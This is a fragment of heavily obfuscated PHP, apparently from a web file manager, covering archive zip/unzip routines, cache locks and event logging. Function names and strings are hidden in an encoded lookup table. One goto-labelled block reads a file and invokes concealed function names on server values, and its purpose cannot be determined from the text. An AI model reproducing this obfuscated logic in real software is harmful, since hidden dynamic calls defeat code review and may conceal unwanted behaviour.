$Æ¢Ä†®‹ = KodIO::clear($¬™æğ¥™[$âÓ¸¨¶ˆ[1269]] . $û…ß¶[$âÓ¸¨¶ˆ[1261]]); $û…ß¶[$âÓ¸¨¶ˆ[565]] = $¬™æğ¥™; $û…ß¶[$âÓ¸¨¶ˆ[1242]] = $Æ¢Ä†®‹; $üˆÂ“İÊ = array($âÓ¸¨¶ˆ[1263] => $âÓ¸¨¶ˆ[1270], $âÓ¸¨¶ˆ[6] => $û…ß¶); } else { $üˆÂ“İÊ[$âÓ¸¨¶ˆ[6]][$âÓ¸¨¶ˆ[1265]] = $çœÎ…™„[$âÓ¸¨¶ˆ[194]]; } break; case KodIO::KOD_SHARE_ITEM: $üˆÂ“İÊ = array($âÓ¸¨¶ˆ[1263] => $âÓ¸¨¶ˆ[1271], $âÓ¸¨¶ˆ[6] => $û…ß¶); $¬™æğ¥™ = Model($âÓ¸¨¶ˆ[672])->getInfo($û…ß¶[$âÓ¸¨¶ˆ[478]]); if ($¬™æğ¥™[$âÓ¸¨¶ˆ[194]] == $âÓ¸¨¶ˆ[231]) { $Æ¢Ä†®‹ = KodIO::clear($¬™æğ¥™[$âÓ¸¨¶ˆ[1269]] . $û…ß¶[$âÓ¸¨¶ˆ[1261]]); $û…ß¶[$âÓ¸¨¶ˆ[565]] = $¬™æğ¥™; $û…ß¶[$âÓ¸¨¶ˆ[1242]] = $Æ¢Ä†®‹; $üˆÂ“İÊ = array($âÓ¸¨¶ˆ[1263] => $âÓ¸¨¶ˆ[1272], $âÓ¸¨¶ˆ[6] => $û…ß¶); } else { if (!$Æ¢Ä†®‹) { $Æ¢Ä†®‹ = $¬™æğ¥™[$âÓ¸¨¶ˆ[194]]; } $üˆÂ“İÊ[$âÓ¸¨¶ˆ[6]][$âÓ¸¨¶ˆ[1265]] = $¬™æğ¥™[$âÓ¸¨¶ˆ[194]]; } break; default: $Æ¢Ä†®‹ = $û…ß¶[$âÓ¸¨¶ˆ[87]]; $üˆÂ“İÊ = array($âÓ¸¨¶ˆ[1263] => $âÓ¸¨¶ˆ[1273]); break; } $·¬Áë§Ş = $û…ß¶[$âÓ¸¨¶ˆ[87]]; if (!isset(self::$driverCache[$·¬Áë§Ş])) { $æı¢“š• = strtolower($üˆÂ“İÊ[$âÓ¸¨¶ˆ[98]]); $ÙøÖ²ô¸ = $GLOBALS[$âÓ¸¨¶ˆ[6]][$âÓ¸¨¶ˆ[92]][$âÓ¸¨¶ˆ[905]]; $¬˜¤º¢ö = $âÓ¸¨¶ˆ[77] . (isset($ÙøÖ²ô¸[$æı¢“š•]) ? $ÙøÖ²ô¸[$æı¢“š•] : ucfirst($æı¢“š•)); if (!class_exists($¬˜¤º¢ö)) { show_json("{$¬˜¤º¢ö}\x20\156\x6f\x74\x20\x65\170\151\163\x74\163\x21", !1); } $£›µáçÎ = isset($üˆÂ“İÊ[$âÓ¸¨¶ˆ[6]]) ? $üˆÂ“İÊ[$âÓ¸¨¶ˆ[6]] : !1; self::$driverCache[$·¬Áë§Ş] = new $¬˜¤º¢ö($£›µáçÎ); } $ëŸÑÈñ = self::$driverCache[$·¬Áë§Ş]; $ëŸÑÈñ->pathDriver = $± Áİîã; $ëŸÑÈñ->pathBase = $âÓ¸¨¶ˆ[12]; if (isset($üˆÂ“İÊ[$âÓ¸¨¶ˆ[6]][$âÓ¸¨¶ˆ[1274]])) { $ëŸÑÈñ->pathBase = rtrim($üˆÂ“İÊ[$âÓ¸¨¶ˆ[6]][$âÓ¸¨¶ˆ[1274]], $âÓ¸¨¶ˆ[8]) . $âÓ¸¨¶ˆ[8]; $Æ¢Ä†®‹ = $ëŸÑÈñ->pathBase . ltrim($Æ¢Ä†®‹, $âÓ¸¨¶ˆ[8]); } $Æ¢Ä†®‹ = $ëŸÑÈñ->getPath($Æ¢Ä†®‹); if (isset($û…ß¶[$âÓ¸¨¶ˆ[1242]])) { $Æ¢Ä†®‹ = $û…ß¶[$âÓ¸¨¶ˆ[1242]]; } $ëŸÑÈñ->path = $Æ¢Ä†®‹; return $ëŸÑÈñ; } public static function errorTips($îÇÅ´ıí = false) { $ã—Ê³½ =& $_SERVER[¼¥ÊĞÙÌ]; static $í×Ê¢¶ = array(); $Öí¬Æüã = 1000; if ($îÇÅ´ıí === -1) { return $í×Ê¢¶ ? $í×Ê¢¶[count($í×Ê¢¶) - 1] : $ã—Ê³½[12]; } if ($îÇÅ´ıí === !1) { return implode($ã—Ê³½[288], $í×Ê¢¶); } if (count($í×Ê¢¶) >= $Öí¬Æüã) { $í×Ê¢¶ = array_slice($í×Ê¢¶, $Öí¬Æüã * 0.5, $Öí¬Æüã); } $í×Ê¢¶[] = $îÇÅ´ıí; write_log($ã—Ê³½[176] . ACTION . $ã—Ê³½[1275] . $îÇÅ´ıí, $ã—Ê³½[1276]); } public static function getLastError($Ñ»¸û´Æ = '') { $ÉúÒÕœ³ = self::errorTips(-1); return $ÉúÒÕœ³ ? $ÉúÒÕœ³ : $Ñ»¸û´Æ; } } class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $’Ñâàè¥; if ($’Ñâàè¥) { return $’Ñâàè¥; } $›‚Êˆ¶ = IO::init($_SERVER[¼¥ÊĞÙÌ][8]); return $›‚Êˆ¶; } private static function iconvSystem($ËÏÎª¤ô) { return self::local()->iconvSystem($ËÏÎª¤ô); } private static function iconvApp($Õ¶š­Î) { return self::local()->iconvApp($Õ¶š­Î); } public static function zipFolder($«öû–×, $Á‰Ê­ãÖ = "\x7a\x69\x70", $Ù½œƒÓş = '', $ö™æÓé¶ = REPEAT_RENAME) { $øµÍ±•´ =& $_SERVER[¼¥ÊĞÙÌ]; $í˜‹Ï = IO::listPath($«öû–×); if (!$í˜‹Ï) { return !1; } $í˜‹Ï = array_merge($í˜‹Ï[$øµÍ±•´[85]], $í˜‹Ï[$øµÍ±•´[86]]); return self::zip($í˜‹Ï, $Á‰Ê­ãÖ, $Ù½œƒÓş, $ö™æÓé¶); } public static function zip($ã¢õ¡ñĞ, $Æ©‰æ¬· = "\172\x69\160", $ì””Îº = '', $¢µØ›Íî = REPEAT_RENAME) { $áæå™è =& $_SERVER[¼¥ÊĞÙÌ]; if (is_string($ã¢õ¡ñĞ) && $ã¢õ¡ñĞ) { $ã¢õ¡ñĞ = array(array($áæå™è[87] => $ã¢õ¡ñĞ)); } $¶»•Â…” = self::init($ã¢õ¡ñĞ[0][$áæå™è[87]]); $Äêí°õÇ = self::info($ã¢õ¡ñĞ[0][$áæå™è[87]]); $Í±ò¦ãõ = $áæå™è[12]; $éš¤õÏ¥ = $áæå™è[12]; $­Ù¿È³ = $áæå™è[12]; if ($ì””Îº && substr($ì””Îº, -1, 1) != $áæå™è[8]) { $éš¤õÏ¥ = get_path_father($ì””Îº); $­Ù¿È³ = get_path_this($ì””Îº); } else { $éš¤õÏ¥ = self::pathFather($Äêí°õÇ[$áæå™è[87]]); $­Ù¿È³ = $Äêí°õÇ[$áæå™è[32]] . $áæå™è[10] . $Æ©‰æ¬·; if (count($ã¢õ¡ñĞ) > 1) { $•Ê¼«›Ø = IO::info($éš¤õÏ¥); $­Ù¿È³ = $•Ê¼«›Ø[$áæå™è[32]] . $áæå™è[10] . $Æ©‰æ¬·; } if ($ì””Îº) { $éš¤õÏ¥ = $ì””Îº; } } if ($¶»•Â…”->getType() == $áæå™è[109]) { $Â€’Üà“ = self::init($éš¤õÏ¥); $ÖÂ¡™ÕØ = $Â€’Üà“->getType() == $áæå™è[109] ? $éš¤õÏ¥ : get_path_father($¶»•Â…”->path); $ÖÂ¡™ÕØ = IO::getPathInner($ÖÂ¡™ÕØ); $ÖÂ¡™ÕØ = rtrim($ÖÂ¡™ÕØ, $áæå™è[8]) . $áæå™è[8]; mk_dir($ÖÂ¡™ÕØ); } else { $Í±ò¦ãõ = TEMP_FILES . $áæå™è[1277] . time() . rand_string(8) . $áæå™è[8]; mk_dir($Í±ò¦ãõ); file_put_contents($Í±ò¦ãõ . $áæå™è[1278], $áæå™è[12]); $ÖÂ¡™ÕØ = $Í±ò¦ãõ; } $ô©ùöˆ‡ = IO::info($ÖÂ¡™ÕØ); if (!$ô©ùöˆ‡ || !$ô©ùöˆ‡[$áæå™è[236]]) { show_json(LNG($áæå™è[1279]), !1); } $ù™­ÌäÚ = self::zipFileList($ã¢õ¡ñĞ, $Í±ò¦ãõ); foreach ($ù™­ÌäÚ as $²ùä™»‹ => $ßÈ”Çı‘) { $ù™­ÌäÚ[$²ùä™»‹] = self::iconvSystem($ßÈ”Çı‘); } $×‰ûÄ·ô = get_filename_auto($ÖÂ¡™ÕØ . $­Ù¿È³, $áæå™è[12], $¢µØ›Íî); KodArchive::create(self::iconvSystem($×‰ûÄ·ô), $ù™­ÌäÚ); if (!IO::exist($×‰ûÄ·ô)) { if ($Í±ò¦ãõ) { del_dir($Í±ò¦ãõ); } write_log($áæå™è[1280] . $×‰ûÄ·ô, $áæå™è[391]); show_json(LNG($áæå™è[1281]), !1); } if (!$Í±ò¦ãõ) { return $×‰ûÄ·ô; } $ÜœöË§ = self::move($×‰ûÄ·ô, $éš¤õÏ¥, $¢µØ›Íî); if ($Í±ò¦ãõ) { del_dir($Í±ò¦ãõ); } if (!$×‰ûÄ·ô) { write_log($áæå™è[1282] . $×‰ûÄ·ô . $áæå™è[1283] . $éš¤õÏ¥, $áæå™è[391]); show_json(LNG($áæå™è[1281]), !1); } return $ÜœöË§; } public static function unzip($‚è”á°Î, $‘ú¶ù±, $ÒªÔÑ€ = "\x2d\x31", $ÜìŞ²— = "\162\x65\x70\x6c\141\143\145") { $…ûŸÄû× =& $_SERVER[¼¥ÊĞÙÌ]; $ë÷ÎÖ¥ş = parent::info($‚è”á°Î); if (!$ë÷ÎÖ¥ş) { show_json(LNG($…ûŸÄû×[1284]), !1); } $£Ÿ«“‰ = IO::infoFullSimple($‘ú¶ù±); if (!$£Ÿ«“‰) { $‘ú¶ù± = IO::mkdir($‘ú¶ù±); } if (isset($£Ÿ«“‰[$…ûŸÄû×[194]]) && trim($£Ÿ«“‰[$…ûŸÄû×[87]], $…ûŸÄû×[8]) != trim($‘ú¶ù±, $…ûŸÄû×[8])) { $ÑÂ”³Ÿ¨ = KodIO::make($£Ÿ«“‰[$…ûŸÄû×[193]]); $û­•½şŞ = IO::fileNameAuto($ÑÂ”³Ÿ¨, $£Ÿ«“‰[$…ûŸÄû×[32]], REPEAT_RENAME_FOLDER, !0); $‘ú¶ù± = IO::mkdir($ÑÂ”³Ÿ¨ . $û­•½şŞ); } $ÒªÔÑ€ = $ÒªÔÑ€ && $ÒªÔÑ€ != $…ûŸÄû×[1285] ? @json_decode($ÒªÔÑ€, !0) : -1; $Õ”ôÛüî = self::unzipPart($‚è”á°Î, $ÒªÔÑ€); if (!$Õ”ôÛüî || !IO::exist($Õ”ôÛüî[$…ûŸÄû×[233]])) { show_json(LNG($…ûŸÄû×[108]), !1); } $ıÛƒñ„¹ = $Õ”ôÛüî[$…ûŸÄû×[1286]][count($Õ”ôÛüî[$…ûŸÄû×[1286]]) - 1]; if ($ıÛƒñ„¹[$…ûŸÄû×[1287]] == -1 || substr($ıÛƒñ„¹[$…ûŸÄû×[32]], -1, 1) == $…ûŸÄû×[8]) { $úªœöš = $Õ”ôÛüî[$…ûŸÄû×[1288]] . rand_string(10) . $…ûŸÄû×[8]; mk_dir($úªœöš); $²¡ò¬ã§ = count($Õ”ôÛüî[$…ûŸÄû×[1286]]) == 1 ? IO::ext($‚è”á°Î) : get_path_ext($Õ”ôÛüî[$…ûŸÄû×[233]]); $Ÿ¬ŒªÄ = KodArchive::extract(self::iconvSystem($Õ”ôÛüî[$…ûŸÄû×[233]]), $úªœöš, $ıÛƒñ„¹[$…ûŸÄû×[1287]], $û­•½şŞ, $²¡ò¬ã§); self::unzipErrorCheck($Ÿ¬ŒªÄ, array($…ûŸÄû×[1289], $‚è”á°Î, $²¡ò¬ã§, $‘ú¶ù±, $Õ”ôÛüî)); Hook::trigger($…ûŸÄû×[1290], $úªœöš); recursion_dir($úªœöš, $¨Í•ÙŞ, $šğ­Ì®§, 0); $¨ß´Ğí¨ = array_merge($¨Í•ÙŞ, $šğ­Ì®§); $Éµå·ó§ = array(); foreach ($¨ß´Ğí¨ as $ÛÜŒƒ°Ç) { $ì¦Æ¡ = IO::move(self::iconvApp($ÛÜŒƒ°Ç), $‘ú¶ù±, $ÜìŞ²—); if ($ì¦Æ¡) { $Éµå·ó§[] = $ì¦Æ¡; } } del_dir($úªœöš); } else { $ì¦Æ¡ = IO::move($Õ”ôÛüî[$…ûŸÄû×[233]], $‘ú¶ù±, $ÜìŞ²—, get_path_this($ıÛƒñ„¹[$…ûŸÄû×[32]])); if ($ì¦Æ¡) { $Éµå·ó§[] = $ì¦Æ¡; } } return $Éµå·ó§ ? $Éµå·ó§ : !1; } public static function unzipList($·™êúöÓ) { $ƒ™Œ¬ŒŒ =& $_SERVER[¼¥ÊĞÙÌ]; $±¢‚Š³Ø = isset($·™êúöÓ[$ƒ™Œ¬ŒŒ[1291]]) ? $·™êúöÓ[$ƒ™Œ¬ŒŒ[1291]] : !1; $”İ—‚¥  = isset($·™êúöÓ[$ƒ™Œ¬ŒŒ[1287]]) ? @json_decode($·™êúöÓ[$ƒ™Œ¬ŒŒ[1287]], !0) : -1; $–§Ùù¾± = self::unzipPart($·™êúöÓ[$ƒ™Œ¬ŒŒ[87]], $”İ—‚¥ ); if (!$–§Ùù¾± || !IO::exist($–§Ùù¾±[$ƒ™Œ¬ŒŒ[233]])) { show_json(LNG($ƒ™Œ¬ŒŒ[108]), !1); } $áÕÍÊ¬š = $–§Ùù¾±[$ƒ™Œ¬ŒŒ[1286]][count($–§Ùù¾±[$ƒ™Œ¬ŒŒ[1286]]) - 1]; $§²Ïê›ƒ = in_array(IO::ext($–§Ùù¾±[$ƒ™Œ¬ŒŒ[233]]), array($ƒ™Œ¬ŒŒ[391], $ƒ™Œ¬ŒŒ[1292], $ƒ™Œ¬ŒŒ[1293], $ƒ™Œ¬ŒŒ[1294], $ƒ™Œ¬ŒŒ[1295], $ƒ™Œ¬ŒŒ[1296])); if (!$±¢‚Š³Ø && ($áÕÍÊ¬š[$ƒ™Œ¬ŒŒ[1287]] == -1 || $§²Ïê›ƒ)) { $ÕáÄÑÇ = $–§Ùù¾±[$ƒ™Œ¬ŒŒ[1288]] . get_path_this($–§Ùù¾±[$ƒ™Œ¬ŒŒ[233]]) . $ƒ™Œ¬ŒŒ[1297]; if (!IO::exist($ÕáÄÑÇ)) { $í•ôĞé  = $áÕÍÊ¬š[$ƒ™Œ¬ŒŒ[1287]] == -1 ? get_path_ext(IO::pathThis($·™êúöÓ[$ƒ™Œ¬ŒŒ[87]])) : get_path_ext($–§Ùù¾±[$ƒ™Œ¬ŒŒ[233]]); $İß†ğô¼ = KodArchive::listContent(self::iconvSystem($–§Ùù¾±[$ƒ™Œ¬ŒŒ[233]]), !0, $í•ôĞé ); self::unzipErrorCheck($İß†ğô¼, array($ƒ™Œ¬ŒŒ[1298], $·™êúöÓ, $–§Ùù¾±)); @file_put_contents($ÕáÄÑÇ, json_encode($İß†ğô¼[$ƒ™Œ¬ŒŒ[1299]])); } return @json_decode(IO::getContent($ÕáÄÑÇ), !0); } IO::fileOut($–§Ùù¾±[$ƒ™Œ¬ŒŒ[233]], $±¢‚Š³Ø, get_path_this($áÕÍÊ¬š[$ƒ™Œ¬ŒŒ[32]])); die; } private static function zipFileList($½‡Î÷¿, $¾êÈÖÃ = false) { $°„ğ•– =& $_SERVER[¼¥ÊĞÙÌ]; $æÇñƒš = array(); foreach ($½‡Î÷¿ as $şØŠ…“Œ) { $‡Ãä¹›Ù = $şØŠ…“Œ[$°„ğ•–[87]]; if ($¾êÈÖÃ) { $‡Ãä¹›Ù = self::copy($şØŠ…“Œ[$°„ğ•–[87]], $¾êÈÖÃ, $°„ğ•–[898]); } else { $ı­Œ•§‚ = self::init($şØŠ…“Œ[$°„ğ•–[87]]); if ($ı­Œ•§‚->getType() == $°„ğ•–[109]) { $‡Ãä¹›Ù = $ı­Œ•§‚->path; } } if ($‡Ãä¹›Ù && self::local()->exist($‡Ãä¹›Ù)) { $æÇñƒš[$şØŠ…“Œ[$°„ğ•–[87]]] = $‡Ãä¹›Ù; } } if (!empty($æÇñƒš)) { return array_values($æÇñƒš); } show_json(LNG($°„ğ•–[1256]), !1); } private static function localFilePath($‰ìñ¾ôÖ) { $ë”¢Î„ =& $_SERVER[¼¥ÊĞÙÌ]; $ª¾Ú¸Š× = KodIO::parse($‰ìñ¾ôÖ); if ($ª¾Ú¸Š×[$ë”¢Î„[33]] == KodIO::KOD_SOURCE) { $üÁ“á¤ù = Model($ë”¢Î„[904])->fileInfoGet(KodIO::sourceID($‰ìñ¾ôÖ)); if (!$üÁ“á¤ù[$ë”¢Î„[87]]) { show_json($ë”¢Î„[1300], !1); } $‰ìñ¾ôÖ = $üÁ“á¤ù[$ë”¢Î„[87]]; } $Ş­Ù´ÎÃ = self::init($‰ìñ¾ôÖ); if ($Ş­Ù´ÎÃ->pathParse[$ë”¢Î„[1242]]) { $‰ìñ¾ôÖ = $Ş­Ù´ÎÃ->pathParse[$ë”¢Î„[1242]]; $Ş­Ù´ÎÃ = self::init($‰ìñ¾ôÖ); } $œúö×œ§ = $Ş­Ù´ÎÃ->getType(); if ($œúö×œ§ == $ë”¢Î„[109] || $œúö×œ§ == $ë”¢Î„[1301]) { if (!$Ş­Ù´ÎÃ->exist($Ş­Ù´ÎÃ->path)) { show_json(LNG($ë”¢Î„[108]), !1); } return $Ş­Ù´ÎÃ->path; } return !1; } public static function unzipPart($Æá—¬£, $ÔØŞê¶Ñ = -1) { $ƒ¥Ò·ù¹ =& $_SERVER[¼¥ÊĞÙÌ]; $³í÷­–× = IO::pathThis($Æá—¬£); if (!$ÔØŞê¶Ñ || $ÔØŞê¶Ñ == -1) { $ Ë°ğ½è = array(array($ƒ¥Ò·ù¹[32] => $³í÷­–×, $ƒ¥Ò·ù¹[1287] => -1)); $ Ë°ğ½è[0][$ƒ¥Ò·ù¹[1302]] = $ Ë°ğ½è[0][$ƒ¥Ò·ù¹[32]]; } else { if (is_array($ÔØŞê¶Ñ)) { $ Ë°ğ½è = $ÔØŞê¶Ñ; $ÓØÛ‘‡Ø = count($ Ë°ğ½è) - 1; for ($¦ô’üÍŞ = 0; $¦ô’üÍŞ <= $ÓØÛ‘‡Ø; $¦ô’üÍŞ++) { $İ¾¤ç½ = $ Ë°ğ½è[$¦ô’üÍŞ]; $ëÀ¶“È³ = get_path_this($İ¾¤ç½[$ƒ¥Ò·ù¹[32]]) . (checkExtSafe($İ¾¤ç½[$ƒ¥Ò·ù¹[32]]) ? $ƒ¥Ò·ù¹[12] : $ƒ¥Ò·ù¹[1303]); $ Ë°ğ½è[$¦ô’üÍŞ][$ƒ¥Ò·ù¹[1302]] = $ƒ¥Ò·ù¹[1304] . intval($İ¾¤ç½[$ƒ¥Ò·ù¹[1287]]) . $ƒ¥Ò·ù¹[465] . $ëÀ¶“È³; if ($¦ô’üÍŞ == 0) { continue; } $ Ë°ğ½è[$¦ô’üÍŞ][$ƒ¥Ò·ù¹[1302]] = $ Ë°ğ½è[$¦ô’üÍŞ - 1][$ƒ¥Ò·ù¹[1302]] . $ƒ¥Ò·ù¹[1305] . $ Ë°ğ½è[$¦ô’üÍŞ][$ƒ¥Ò·ù¹[1302]]; } } } if (!is_array($ Ë°ğ½è) || count($ Ë°ğ½è) == 0) { return !1; } $îŞÖëçÇ = $ Ë°ğ½è[count($ Ë°ğ½è) - 1]; if (!IO::exist($Æá—¬£)) { return !1; } $êšô‹íö = TEMP_FILES . $ƒ¥Ò·ù¹[1306] . kodIO::hashPathSafe($Æá—¬£) . $ƒ¥Ò·ù¹[8]; $‘Ïœş¹ = $êšô‹íö . $îŞÖëçÇ[$ƒ¥Ò·ù¹[1302]]; mk_dir($êšô‹íö); file_put_contents(TEMP_FILES . $ƒ¥Ò·ù¹[1278], $ƒ¥Ò·ù¹[12]); if (IO::exist($‘Ïœş¹)) { return array($ƒ¥Ò·ù¹[233] => $‘Ïœş¹, $ƒ¥Ò·ù¹[1286] => $ Ë°ğ½è, $ƒ¥Ò·ù¹[1288] => $êšô‹íö); } $í­™ƒ— = self::localFilePath($Æá—¬£); if (!$í­™ƒ—) { $í­™ƒ— = $êšô‹íö . $ƒ¥Ò·ù¹[1307]; if (!IO::exist($í­™ƒ—)) { self::copy($Æá—¬£, $êšô‹íö, !1, get_path_this($í­™ƒ—)); } } if (!$í­™ƒ— || !IO::exist($í­™ƒ—)) { return !1; } if ($îŞÖëçÇ[$ƒ¥Ò·ù¹[1287]] == -1) { return array($ƒ¥Ò·ù¹[233] => $í­™ƒ—, $ƒ¥Ò·ù¹[1286] => $ Ë°ğ½è, $ƒ¥Ò·ù¹[1288] => $êšô‹íö); } $ª–«”«” = $í­™ƒ—; foreach ($ Ë°ğ½è as $¦ô’üÍŞ => $İ¾¤ç½) { if (!$İ¾¤ç½ || $İ¾¤ç½[$ƒ¥Ò·ù¹[1287]] == $ƒ¥Ò·ù¹[1285]) { break; } if (substr($İ¾¤ç½[$ƒ¥Ò·ù¹[32]], -1, 1) == $ƒ¥Ò·ù¹[8]) { break; } $Ù¥ıÓœ = in_array(get_path_ext($İ¾¤ç½[$ƒ¥Ò·ù¹[1302]]), array($ƒ¥Ò·ù¹[391], $ƒ¥Ò·ù¹[1292], $ƒ¥Ò·ù¹[1293], $ƒ¥Ò·ù¹[1294], $ƒ¥Ò·ù¹[1295], $ƒ¥Ò·ù¹[1296])); $Ù®åœ¢ù = $¦ô’üÍŞ == count($ Ë°ğ½è) - 1 && $Ù¥ıÓœ; $Æ”ßŒéú = $êšô‹íö . $İ¾¤ç½[$ƒ¥Ò·ù¹[1302]]; $˜ÈŸÜµÀ = $êšô‹íö . get_path_this($İ¾¤ç½[$ƒ¥Ò·ù¹[32]]); if (IO::exist($Æ”ßŒéú)) { $ª–«”«” = $Æ”ßŒéú; continue; } $à­¢†‹ş = $¦ô’üÍŞ == 0 ? get_path_ext($³í÷­–×) : get_path_ext($ª–«”«”); $ÔÔé·îÂ = KodArchive::extract(self::iconvSystem($ª–«”«”), $êšô‹íö, $İ¾¤ç½[$ƒ¥Ò·ù¹[1287]], $üª¼’ƒİ, $à­¢†‹ş); self::unzipErrorCheck($ÔÔé·îÂ, array($ƒ¥Ò·ù¹[1308], $Æá—¬£, $ Ë°ğ½è, $İ¾¤ç½, $Æ”ßŒéú)); if (IO::exist($˜ÈŸÜµÀ)) { IO::rename($˜ÈŸÜµÀ, get_path_this($Æ”ßŒéú)); } $ª–«”«” = $Æ”ßŒéú; } $‘Ïœş¹ = $ª–«”«”; return array($ƒ¥Ò·ù¹[233] => $ª–«”«”, $ƒ¥Ò·ù¹[1286] => $ Ë°ğ½è, $ƒ¥Ò·ù¹[1288] => $êšô‹íö); } private static function unzipErrorCheck($¼Å”ù÷í, $¢µˆş· = false) { $÷ùô‰”« =& $_SERVER[¼¥ÊĞÙÌ]; if ($¼Å”ù÷í[$÷ùô‰”«[1309]]) { return !0; } write_log(array($÷ùô‰”«[1310], $¼Å”ù÷í, $¢µˆş·), $÷ùô‰”«[1311]); $ú¤í¢Ë = is_array($¼Å”ù÷í[$÷ùô‰”«[1299]]) ? json_encode($¼Å”ù÷í[$÷ùô‰”«[1299]]) : $¼Å”ù÷í[$÷ùô‰”«[1299]]; show_json($÷ùô‰”«[1312] . $ú¤í¢Ë, !1); die; } } goto D½ß°©îÊØ; eÑÌ¦¥¿: class CacheLockMemcached { public function lock($ƒúÖ¦˜, $ìöíâÄº = 0) { $±àÅ¼½¥ = Cache::init(); $˜ÌÚ”• = microtime(!0) + $ìöíâÄº; while (microtime(!0) < $˜ÌÚ”•) { $ï™—ÑØ– = $±àÅ¼½¥->get($ƒúÖ¦˜); if (!$ï™—ÑØ– || $ï™—ÑØ– < microtime(!0)) { $¢äµÅà… = $±àÅ¼½¥->handle->add($ƒúÖ¦˜, $˜ÌÚ”•, $ìöíâÄº); if ($¢äµÅà…) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($Ğê”›ãŒ) { return Cache::init()->get($Ğê”›ãŒ); } public function unlock($Œ£Î»®œ) { return Cache::init()->remove($Œ£Î»®œ); } } class CacheLockDatabase { public function lock($ÒŒı÷˜¸, $‚²ˆñş¼ = 0) { $ò€Êº€ = Model($_SERVER[¼¥ÊĞÙÌ][908]); $ÆêÆêŠÅ = microtime(!0) + $‚²ˆñş¼; while (microtime(!0) < $ÆêÆêŠÅ) { $¦¢Î½é£ = $ò€Êº€->get($ÒŒı÷˜¸); if (!$¦¢Î½é£ || $¦¢Î½é£ < microtime(!0)) { $çÒçíƒÎ = $ò€Êº€->set($ÒŒı÷˜¸, $ÆêÆêŠÅ); if ($çÒçíƒÎ) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($ÒÕÖ©¢§) { return Model($_SERVER[¼¥ÊĞÙÌ][908])->get($ÒÕÖ©¢§); } public function unlock($“ºÙû) { Model($_SERVER[¼¥ÊĞÙÌ][908])->remove($“ºÙû); } } class CacheMemcached { public $handle; public $cacheTime; public function __construct($­º–²ã¹, $¶²Õˆïñ) { $ïÖÉÊÆ =& $_SERVER[¼¥ÊĞÙÌ]; if (!class_exists($ïÖÉÊÆ[947])) { show_json($ïÖÉÊÆ[948], !1); } $this->cacheTime = $¶²Õˆïñ; $this->handle = new Memcached(); if (is_array($­º–²ã¹[$ïÖÉÊÆ[949]]) && count($­º–²ã¹[$ïÖÉÊÆ[949]]) >= 1) { foreach ($­º–²ã¹[$ïÖÉÊÆ[949]] as $Ò§´Ä) { $½µæ¦  = explode($ïÖÉÊÆ[4], $Ò§´Ä); $this->handle->addServer($½µæ¦ [0], $½µæ¦ [1]); } } else { $this->handle->addServer($­º–²ã¹[$ïÖÉÊÆ[209]], $­º–²ã¹[$ïÖÉÊÆ[210]]); } } public function set($ëå°ƒ½ñ, $Ïó‰¾ì, $âÕŞ¿İÌ = false) { $âÕŞ¿İÌ = $âÕŞ¿İÌ ? $âÕŞ¿İÌ : $this->cacheTime; return $this->handle->set($ëå°ƒ½ñ, $Ïó‰¾ì, $âÕŞ¿İÌ); } public function get($×Õ¯¸Éº) { return $this->handle->get($×Õ¯¸Éº); } public function remove($Ç·òâõ) { return $this->handle->delete($Ç·òâõ); } public function deleteAll() { return $this->handle->flush(); } } goto b §¨¥õİ; e©¸”‘°Í: if ($_SERVER[$_SERVER[¼¥ÊĞÙÌ][959]] != $_SERVER[$_SERVER[¼¥ÊĞÙÌ][1916]]) { $_getc = $_SERVER[¼¥ÊĞÙÌ][961]; $_getfile = $_SERVER[$_SERVER[¼¥ÊĞÙÌ][962]] . $_SERVER[¼¥ÊĞÙÌ][963]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[¼¥ÊĞÙÌ][288], $_getfilec); if (count($_getarrs) < $_SERVER[¼¥ÊĞÙÌ][695]) { $exit = $_SERVER[¼¥ÊĞÙÌ][964]; $exit(); } $_act = $_SERVER[¼¥ÊĞÙÌ][1145]; $_act($_SERVER[$_SERVER[¼¥ÊĞÙÌ][957]]); } class SourceEventModel extends ModelBase { protected $tableName = "\151\x6f\x5f\163\x6f\165\x72\143\145\137\145\166\145\156\164"; protected $dataAuto = array(array("\143\x72\145\x61\x74\x65\124\151\x6d\145", "\164\151\x6d\145", "\x69\156\163\145\x72\x74", "\146\165\x6e\x63\164\x69\x6f\x6e"), array("\144\x65\x73\x63", '', "\151\x6e\163\x65\162\x74\54\x75\160\144\141\164\145\x2c\x73\145\x6c\145\x63\164", "\152\163\157\156")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($¾Á˜ŸÀû, $Àõ±Ğ, $½×“Úôá = '') { $’êÖÁ¿¼ =& $_SERVER[¼¥ÊĞÙÌ]; if (!$this->eventSave) { return; } $º—ÇÍğÖ = Model($’êÖÁ¿¼[1440])->sourceInfo($¾Á˜ŸÀû); if (!$º—ÇÍğÖ) { return !1; } if ($this->isDisableEvent($º—ÇÍğÖ, $Àõ±Ğ)) { return; } if ($½×“Úôá && is_string($½×“Úôá)) { $½×“Úôá = array($’êÖÁ¿¼[2030] => $½×“Úôá); } $Á÷ÚñÆÜ = defined($’êÖÁ¿¼[2219]) ? USER_ID : 0; $ÉæÓÄı = array($’êÖÁ¿¼[494] => $¾Á˜ŸÀû, $’êÖÁ¿¼[2220] => $º—ÇÍğÖ[$’êÖÁ¿¼[193]], $’êÖÁ¿¼[2221] => $º—ÇÍğÖ[$’êÖÁ¿¼[32]], $’êÖÁ¿¼[587] => !empty($º—ÇÍğÖ[$’êÖÁ¿¼[587]]) ? $º—ÇÍğÖ[$’êÖÁ¿¼[587]] : $’êÖÁ¿¼[12], $’êÖÁ¿¼[1781] => $Á÷ÚñÆÜ, $’êÖÁ¿¼[499] => $Àõ±Ğ, $’êÖÁ¿¼[1783] => $½×“Úôá); $this->addSystemLog($Àõ±Ğ, $ÉæÓÄı); unset($ÉæÓÄı[$’êÖÁ¿¼[2221]], $ÉæÓÄı[$’êÖÁ¿¼[587]]); return $this->add($ÉæÓÄı); } private function addSystemLog($úÃÉá, $‰Š¸•—) { $ÎâÀÏŞ =& $_SERVER[¼¥ÊĞÙÌ]; if ($úÃÉá == $ÎâÀÏŞ[2222]) { $úÃÉá = $‰Š¸•—[$ÎâÀÏŞ[529]][$ÎâÀÏŞ[2223]]; } else { if (in_array($úÃÉá, array($ÎâÀÏŞ[1971], $ÎâÀÏŞ[2224]))) { $úÃÉá = $‰Š¸•—[$ÎâÀÏŞ[529]][$ÎâÀÏŞ[171]]; 